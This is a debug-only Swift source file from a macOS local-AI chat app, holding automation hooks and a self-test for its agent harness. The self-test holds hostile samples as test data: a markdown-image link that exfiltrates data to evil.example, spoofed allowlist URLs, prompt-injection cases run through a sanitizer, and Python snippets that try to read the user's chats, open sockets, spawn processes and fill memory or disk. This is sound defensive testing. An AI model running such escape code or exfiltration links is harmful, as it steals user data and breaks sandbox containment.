#if DEBUG
import AppKit
import SwiftUI

/// Debug-build-only automation used for UI verification without Screen Recording permission.
///   LOCALAI_SNAPSHOT_DIR=/path      write window snapshots (snap-N.png) every LOCALAI_SNAPSHOT_INTERVAL seconds
///   LOCALAI_AUTOPROMPT="text"       start a new chat and send this prompt after launch; " || " separates several
///   LOCALAI_STOP_AFTER=3            press Stop this many seconds after the autoprompt starts
///   LOCALAI_SCROLL_TO=0.8           scroll the page to this fraction of its height after 2 s
///   LOCALAI_SHOW_MODEL_PICKER=1     open the model + quant picker after launch
///   LOCALAI_NO_ACTIVATE=1           don't bring the app to the front on launch
///   LOCALAI_DATA_DIR=/path          keep chats in this folder instead of the user's
///   LOCALAI_DESTINATION=model|hardware|harness|library   open that page after launch
///   LOCALAI_AUTOTEST=model|hardware|harness      run that test after launch
///   LOCALAI_TEST_MODEL=tag          model the model test runs on (the chat's model stays as it is)
///   LOCALAI_SHOW_TEST_PICKER=1      open the model test's model picker after launch
///   LOCALAI_EXPAND_TESTS=id,id      open these questions in the model test dashboard
///   LOCALAI_DUMP_SUITE=/path.json   write the model test as JSON, to run it outside the app
///   LOCALAI_GRADE=/path.json        grade replies from {"id": "reply"}, writing /path.json.graded.json
///   LOCALAI_TELEMETRY=0|1           start with the telemetry panel closed or open; =cycle closes it after 3 s
///   LOCALAI_HARNESS_CHECK=/path.txt check the harness's allowlist, calculator, guard and web tools, writing a report
///   LOCALAI_WEB_VIA_CURL=1          make the harness's web requests with curl (see WebTools)
///   LOCALAI_CLOSE_MAIN=3            close the main window after this many seconds, like its red button
///   LOCALAI_CHATS=0|1               start with the chats closed or open
///   LOCALAI_CHAT_SEARCH=text        search the chats for this after launch
///   LOCALAI_HARNESS_SAMPLE=id,id    run these questions through the harness; LOCALAI_SAMPLE_OUT=/path gets the report
///   LOCALAI_CHAT_HARNESS=1          turn the harness on for chat
///   LOCALAI_WINDOW_SIZE=1380x2400   resize the main window after launch, to snapshot more of a page
///   LOCALAI_RENDER_DIR=/path        render both full dashboards (narrow and wide) after LOCALAI_RENDER_DELAY seconds
@MainActor
enum DebugHooks {
    static func install(chat: ChatController, ui: UIState, lab: TestLab, backends: BackendController,
                        monitor: SystemMonitor, settings: AppSettings) {
        let env = ProcessInfo.processInfo.environment
        if env["LOCALAI_CLOSE_MAIN"] != nil {
            Task {
                try? await Task.sleep(for: .seconds(Double(env["LOCALAI_CLOSE_MAIN"] ?? "") ?? 3))
                let main = NSApp.windows.first { $0.identifier?.rawValue.hasPrefix("main") == true }
                print("closing:", main?.identifier?.rawValue ?? "no main window", "of", NSApp.windows.map { $0.identifier?.rawValue ?? "?" })
                main?.performClose(nil)
                main?.close()
            }
        }
        if env["LOCALAI_CHAT_HARNESS"] != nil { settings.harnessEnabled = true }
        if let size = env["LOCALAI_WINDOW_SIZE"]?.split(separator: "x").compactMap({ Double($0) }), size.count == 2 {
            Task {
                try? await Task.sleep(for: .seconds(1))
                if let window = NSApp.windows.first(where: { $0.identifier?.rawValue.hasPrefix("main") == true }) {
                    window.setFrame(NSRect(x: 40, y: 40, width: size[0], height: size[1]), display: true)
                }
            }
        }
        if let chats = env["LOCALAI_CHATS"] { settings.chatsOpen = chats != "0" }
        if let search = env["LOCALAI_CHAT_SEARCH"] { ui.chatSearch = search }
        switch env["LOCALAI_DESTINATION"] {
        case "model": ui.openTests(.model)
        case "hardware": ui.openTests(.hardware)
        case "harness": ui.openTests(.harness)
        case "library": ui.destination = .library
        default: break
        }
        if let telemetry = env["LOCALAI_TELEMETRY"] {
            settings.telemetryOpen = telemetry != "0"
            if telemetry == "cycle" {
                Task {
                    try? await Task.sleep(for: .seconds(3))
                    settings.telemetryOpen = false
                }
            }
        }
        if let dir = env["LOCALAI_RENDER_DIR"] {
            Task {
                try? await Task.sleep(for: .seconds(Double(env["LOCALAI_RENDER_DELAY"] ?? "") ?? 3))
                let pages: [(String, AnyView)] = [("model", AnyView(ModelTestDashboard(scrollable: false))),
                                                  ("model-leaderboard", AnyView(ModelTestDashboard(scrollable: false, detail: .leaderboard))),
                                                  ("hardware", AnyView(HardwareTestDashboard(scrollable: false))),
                                                  ("hardware-steps", AnyView(HardwareTestDashboard(scrollable: false, detail: .phases))),
                                                  ("harness", AnyView(HarnessTestDashboard(scrollable: false))),
                                                  ("harness-changes", AnyView(HarnessTestDashboard(scrollable: false, detail: .changes))),
                                                  ("harness-tools", AnyView(HarnessTestDashboard(scrollable: false, detail: .tools))),
                                                  ("harness-sites", AnyView(HarnessTestDashboard(scrollable: false, detail: .sites)))]
                for (name, page) in pages {
                    for width in [760.0, 1120.0] {
                        let content = page
                            .environment(settings).environment(backends).environment(chat)
                            .environment(monitor).environment(ui).environment(lab)
                            .frame(width: width)
                            .background(Color(white: 0.12))
                            .environment(\.colorScheme, .dark)
                        let renderer = ImageRenderer(content: content)
                        renderer.scale = 2
                        if let cg = renderer.cgImage,
                           let png = NSBitmapImageRep(cgImage: cg).representation(using: .png, properties: [:]) {
                            try? png.write(to: URL(fileURLWithPath: "\(dir)/\(name)-\(Int(width)).png"))
                        }
                    }
                }
            }
        }
        if let path = env["LOCALAI_HARNESS_CHECK"] {
            Task {
                let report = await harnessCheck()
                try? report.write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        lab.testModelID = env["LOCALAI_TEST_MODEL"]
        if let sample = env["LOCALAI_HARNESS_SAMPLE"], let out = env["LOCALAI_SAMPLE_OUT"] {
            Task {
                for _ in 0..<40 where !chat.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                lab.debugSample(ids: sample.split(separator: ",").map(String.init), backends: backends, settings: settings, path: out)
            }
        }
        lab.expandedQuestions = Set((env["LOCALAI_EXPAND_TESTS"] ?? "").split(separator: ",").map(String.init))
        let suite = ModelTestSuite.questions(contextLength: 8_192)
        if let path = env["LOCALAI_DUMP_SUITE"] {
            let dump = suite.map { ["id": $0.id, "level": $0.level.name, "points": "\($0.level.weight)", "prompt": $0.prompt, "expected": $0.expected] }
            if let data = try? JSONSerialization.data(withJSONObject: dump, options: [.prettyPrinted, .sortedKeys]) {
                try? data.write(to: URL(fileURLWithPath: path))
            }
        }
        if let path = env["LOCALAI_GRADE"], let data = FileManager.default.contents(atPath: path),
           let replies = (try? JSONSerialization.jsonObject(with: data)) as? [String: String] {
            let graded = suite.map { q -> [String: String] in
                let reply = replies[q.id] ?? ""
                return ["id": q.id, "points": "\(q.level.weight)", "passed": "\(q.grade(reply))", "expected": q.expected,
                        "final": ModelTestSuite.finalAnswer(reply)]
            }
            if let out = try? JSONSerialization.data(withJSONObject: graded, options: [.prettyPrinted, .sortedKeys]) {
                try? out.write(to: URL(fileURLWithPath: path + ".graded.json"))
            }
        }
        if env["LOCALAI_SHOW_TEST_PICKER"] != nil {
            Task {
                try? await Task.sleep(for: .seconds(2.5))
                ui.showTestModelPicker = true
            }
        }
        if let test = env["LOCALAI_AUTOTEST"] {
            Task {
                for _ in 0..<40 where !chat.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                try? await Task.sleep(for: .seconds(1))
                if test == "hardware" {
                    lab.runHardwareTest(monitor: monitor, backends: backends)
                } else if test == "harness" {
                    lab.runHarnessTest(backends: backends, settings: settings)
                } else {
                    lab.runModelTest(backends: backends, settings: settings)
                }
            }
        }
        if let prompt = env["LOCALAI_AUTOPROMPT"] {
            Task {
                for _ in 0..<40 where !chat.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                chat.newConversation()
                if let stop = Double(env["LOCALAI_STOP_AFTER"] ?? "") {
                    Task {
                        try? await Task.sleep(for: .seconds(stop))
                        chat.stop()
                    }
                }
                for part in prompt.components(separatedBy: " || ") {
                    chat.send(part)
                    while chat.isGenerating { try? await Task.sleep(for: .milliseconds(250)) }
                }
            }
        }
        if let fraction = Double(env["LOCALAI_SCROLL_TO"] ?? "") {
            Task {
                try? await Task.sleep(for: .seconds(2))
                func scrollViews(in view: NSView) -> [NSScrollView] {
                    (view as? NSScrollView).map { [$0] } ?? view.subviews.flatMap(scrollViews)
                }
                guard let content = NSApp.windows.first(where: { $0.identifier?.rawValue.hasPrefix("main") == true })?.contentView,
                      let page = scrollViews(in: content).max(by: { ($0.documentView?.frame.height ?? 0) < ($1.documentView?.frame.height ?? 0) }),
                      let height = page.documentView?.frame.height else { return }
                page.documentView?.scroll(NSPoint(x: 0, y: (height - page.contentView.bounds.height) * fraction))
            }
        }
        if env["LOCALAI_SHOW_MODEL_PICKER"] != nil {
            Task {
                try? await Task.sleep(for: .seconds(2.5))
                ui.showModelPicker = true
            }
        }
        if let dir = env["LOCALAI_SNAPSHOT_DIR"] {
            let interval = Double(env["LOCALAI_SNAPSHOT_INTERVAL"] ?? "") ?? 4
            let count = Int(env["LOCALAI_SNAPSHOT_COUNT"] ?? "") ?? 5
            Task {
                for i in 0..<count {
                    try? await Task.sleep(for: .seconds(interval))
                    snapshot(to: "\(dir)/snap-\(i).png")
                }
            }
        }
    }

    private static func harnessCheck() async -> String {
        var lines: [String] = []
        func expect(_ name: String, _ ok: Bool) { lines.append("\(ok ? "PASS" : "FAIL") \(name)") }
        expect("100 trusted sites, no duplicates", TrustedSites.all.count == 100 && Set(TrustedSites.all.map(\.domain)).count == 100)
        for (address, trusted) in [("https://en.wikipedia.org/wiki/Bee", true), ("https://docs.python.org/3/", true),
                                   ("http://en.wikipedia.org/wiki/Bee", false), ("https://wikipedia.org.evil.example/x", false),
                                   ("https://evilwikipedia.org/x", false), ("https://evil.example/?u=wikipedia.org", false)] {
            expect("allowlist \(address) -> \(trusted)", URL(string: address).map(TrustedSites.isTrusted) == trusted)
        }
        for (expression, result) in [("47*23", "1081"), ("powmod(7,2025,1000)", "807"), ("comb(10,3)", "120"), ("2^10 + (3-1)*4", "1032"),
                                     ("10/4", "2.5"), ("factorial(5)", "120"), ("gcd(100,75)", "25"), ("-3+5", "2")] {
            expect("calc \(expression) = \(result)", Calculator.evaluate(expression) == result)
        }
        expect("calc rejects code", Calculator.evaluate("system('ls')").hasPrefix("Error"))
        expect("calc rejects divide by zero", Calculator.evaluate("1/0").hasPrefix("Error"))
        for attack in InjectionSuite.cases {
            let clean = PromptGuard.sanitize(attack.page)
            let survived = attack.canaries.contains { clean.text.contains($0) } && attack.id != "hidden-comment" && attack.id != "false-authority"
            expect("guard removes \(attack.id) (removed \(clean.removed))", clean.removed > 0 && !survived)
            expect("guard keeps the facts of \(attack.id)", clean.text.localizedCaseInsensitiveContains(attack.topicWord))
        }
        let ordinary = "You must install Python first. The system has a default prompt. Rules of the game are simple. Previous versions were slower."
        expect("guard leaves ordinary text alone", PromptGuard.sanitize(ordinary).removed == 0)
        let filtered = PromptGuard.filterReply("See ![x](https://evil.example/log?d=1) and https://en.wikipedia.org/wiki/Bee with ZEBRA-9183.", secret: "ZEBRA-9183")
        expect("reply filter: \(filtered.text)", filtered.blocked == 2 && !filtered.text.contains("evil.example")
               && !filtered.text.contains("ZEBRA") && filtered.text.contains("en.wikipedia.org"))
        let html = "<p>Visible</p><div style=\"display:none\">secret</div><!-- c --><script>x()</script><span hidden>h</span>"
        expect("hidden HTML removed: \(WebTools.plainText(html))", WebTools.plainText(html) == "Visible")
        let results = (try? await WebTools.search("Mordell conjecture proof").get()) ?? ""
        lines.append("SEARCH:\n\(results.prefix(900))")
        expect("search returns Wikipedia", results.contains("wikipedia.org"))
        switch await WebTools.open("https://en.wikipedia.org/wiki/Faltings%27s_theorem?stolen=data") {
        case .success(let text):
            expect("page opens as text (\(text.count) chars)", text.contains("Faltings") && !text.contains("<div"))
            lines.append("PAGE START: \(text.prefix(300))")
        case .failure(let error):
            expect("page opens: \(error.message)", false)
            lines.append("ERROR: \(WebTools.lastError.prefix(600))")
        }
        if case .failure(let error) = await WebTools.open("https://evil.example/x") {
            expect("untrusted page refused: \(error.message)", true)
        } else {
            expect("untrusted page refused", false)
        }
        // The loop's parts that need no model.
        let suite = ModelTestSuite.questions(contextLength: 4_096)
        func prompt(_ id: String) -> String { suite.first { $0.id == id }?.prompt ?? "" }
        let kinds: [String: TestLab.TaskKind] = ["math": .calculation, "reason": .other, "know": .fact, "follow": .writing, "code": .code, "long": .document]
        for question in suite {
            let kind = TestLab.plainKind(of: HarnessTask(prompt: question.prompt))
            expect("\(question.id) reads as \(kind?.rawValue ?? "unknown")", kind == kinds[String(question.id.prefix { $0 != "-" })])
        }
        let sea = TextRules(task: prompt("follow-3"))
        expect("rules of follow-3", sea.unit == .sentence && sea.count == 3 && sea.wordsAt == [1: 5] && sea.startLetter == "s" && sea.bannedWords == ["water"])
        expect("good text passes", sea.violations(of: "Seas sing to sailors. Sharks swim very far out. Salt stings all sailors.").isEmpty)
        let broken = sea.violations(of: "Seas sing. Waves crash on the shore today now. Salt water stings.")
        expect("bad text fails: \(broken)", broken.count == 3)
        let poem = TextRules(task: prompt("follow-4"))
        expect("rules of follow-4", poem.unit == .line && poem.count == 4 && poem.wordsAt == [0: 3, 1: 5, 2: 7, 3: 9] && poem.startLetter == "t" && poem.bannedLetters == ["e"])
        let sky = TextRules(task: prompt("follow-1"))
        expect("rules of follow-1", sky.totalWords == 3 && sky.lowercase && sky.noPunctuation)
        expect("tidied words: \(sky.tidied("Blue, Vast, Endless."))", sky.tidied("Blue, Vast, Endless.") == "blue vast endless")
        let json = TextRules(task: prompt("follow-2"))
        expect("rules of follow-2", json.jsonOnly && json.jsonKeys == ["name", "age"])
        expect("fences removed", json.violations(of: json.tidied("```json\n{\"name\": \"Al\", \"age\": 3}\n```")).isEmpty)
        let form = TextRules(task: prompt("math-1"))
        expect("last line form", form.finalLabel == "Answer" && !form.hasShape)
        expect("placeholder cleared: \(form.tidied("Answer: <your answer>22"))", form.tidied("Answer: <your answer>22") == "Answer: 22")
        expect("angle brackets cleared", form.tidied("Answer: <Lee> /think") == "Answer: Lee")
        expect("empty last line fails", !form.violations(of: "Answer:").isEmpty && form.violations(of: "Answer: 12").isEmpty)
        for (id, wanted, unwanted) in [("long-1", "MAPLE-7342", ""), ("long-2", "current access code", ""), ("long-3", "K-552", "K-525")] {
            let task = HarnessTask(prompt: prompt(id))
            let found = PassageFinder.chain(in: task.document ?? "", for: task.body, maxCharacters: 2_000).passages
            lines.append("\(id) passages: \(found)")
            expect("\(id) finds \(wanted)", found.contains { $0.contains(wanted) } && (unwanted.isEmpty || !found.contains { $0.contains(unwanted) }))
        }
        let audit = HarnessTask(prompt: prompt("long-4"))
        let auditLines = PassageFinder.chain(in: audit.document ?? "", for: audit.body, maxCharacters: 2_400, closeness: 0.55).passages
        lines.append("long-4 passages: \(auditLines)")
        expect("long-4 counts and finds every notice", audit.needsCounting && auditLines.filter { $0.hasPrefix("Notice") }.count >= 3)
        for (output, result) in [("54.0", "54"), ("1\n4\n6", "1 4 6"), ("The total is 12 crates", "12")] {
            expect("result of \(output.debugDescription) is \(result)", HarnessText.keyResult(of: output) == result)
        }
        expect("result in one string", HarnessText.mentions("1 4 6 3 5 2", in: "Work.\nAnswer: 146352", label: "Answer"))
        expect("result missing", !HarnessText.mentions("126", in: "Answer: 125", label: "Answer"))
        expect("result written in", HarnessText.adding("126", to: "Hm.\nAnswer: 125", label: "Answer") == "Hm.\nAnswer: 126")
        expect("query cleaned", HarnessText.cleanQuery("Answer: Ramesses II, Hittite, Kadesh, treaty") == "Ramesses II Hittite Kadesh treaty")
        let ranked = HarnessText.ranked([SearchHit(title: "Hittites", url: "https://en.wikipedia.org/wiki/Hittites"),
                                         SearchHit(title: "Egyptian–Hittite peace treaty", url: "https://en.wikipedia.org/wiki/Treaty")], for: "peace treaty Hittite")
        expect("best title first", ranked.first?.title.contains("treaty") == true)
        // The code runner, against code trying to get out. Every attempt has to fail.
        let home = NSHomeDirectory()
        let attacks: [(String, String)] = [
            ("read chats", "print(open('\(home)/Library/Application Support/LocalAIAgent/conversations.json').read(9))"),
            ("list Documents", "import os; print(os.listdir('\(home)/Documents'))"),
            ("write home", "open('\(home)/prometheus-escape.txt','w').write('x'); print('wrote')"),
            ("write tmp", "open('/tmp/prometheus-escape.txt','w').write('x'); print('wrote')"),
            ("internet", "import socket; socket.create_connection(('1.1.1.1',443),3); print('connected')"),
            ("Ollama", "import socket; socket.create_connection(('127.0.0.1',11434),3); print('connected')"),
            ("run a program", "import subprocess; print(subprocess.run(['/bin/ls','/'],capture_output=True).stdout)"),
            ("fork", "import os; print('forked', os.fork())"),
            ("signal launchd", "import os; os.kill(1,0); print('signalled')"),
        ]
        for (name, code) in attacks {
            let outcome = await CodeRunner.run("print('started', flush=True)\n" + code + "\n", language: .python)
            // It has to have really started, or the failure proves nothing.
            expect("code can't \(name): \(outcome.output.split(separator: "\n").last ?? "")",
                   !outcome.succeeded && outcome.output.hasPrefix("started"))
        }
        let added = await CodeRunner.run("print(sum(i*i for i in range(4)))\n", language: .python)
        expect("python runs: \(added.output)", added.succeeded && added.output == "14")
        let order = await CodeRunner.run("console.log(1);setTimeout(()=>console.log(2),0);Promise.resolve().then(()=>console.log(3))\n", language: .javascript)
        expect("javascript runs: \(order.output.replacingOccurrences(of: "\n", with: " "))", order.succeeded && order.output == "1\n3\n2")
        let file = await CodeRunner.run("print(open('task.txt').read())\n", language: .python, files: ["task.txt": "hello", "../escape.txt": "x"])
        expect("files reach the code: \(file.output)", file.output == "hello")
        let hang = await CodeRunner.run("while True: pass\n", language: .python)
        expect("endless loop stopped: \(hang.output)", hang.limit != nil && !hang.succeeded)
        let flood = await CodeRunner.run("while True: print('x'*1000)\n", language: .python)
        expect("output flood stopped (\(flood.output.count) chars)", flood.limit != nil && flood.output.count < 9_000)
        let memory = await CodeRunner.run("print('started', flush=True)\nx=[]\nwhile True: x.append(bytearray(b'x'*50000000))\n", language: .python)
        expect("memory bomb stopped: \(memory.output.suffix(50))", !memory.succeeded && memory.output.hasPrefix("started"))
        let disk = await CodeRunner.run("print('started', flush=True)\nf=open('big','wb')\nwhile True: f.write(b'x'*1000000); f.flush()\n", language: .python)
        expect("disk filler stopped: \(disk.output.suffix(50))", !disk.succeeded && disk.output.hasPrefix("started"))
        return lines.joined(separator: "\n")
    }

    static func snapshot(to path: String) {
        guard let window = NSApp.windows.first(where: { $0.isVisible && $0.className.contains("AppKitWindow") }) ?? NSApp.mainWindow else { return }
        write(window, to: path)
        if let sheet = window.attachedSheet {
            write(sheet, to: path.replacingOccurrences(of: ".png", with: "-sheet.png"))
        }
        for (i, popover) in NSApp.windows.filter({ $0.isVisible && $0.className.contains("Popover") }).enumerated() {
            write(popover, to: path.replacingOccurrences(of: ".png", with: "-popover\(i).png"))
        }
    }

    private static func write(_ window: NSWindow, to path: String) {
        guard let view = window.contentView?.superview ?? window.contentView,
              let rep = view.bitmapImageRepForCachingDisplay(in: view.bounds) else { return }
        view.cacheDisplay(in: view.bounds, to: rep)
        try? rep.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: path))
    }
}
#endif
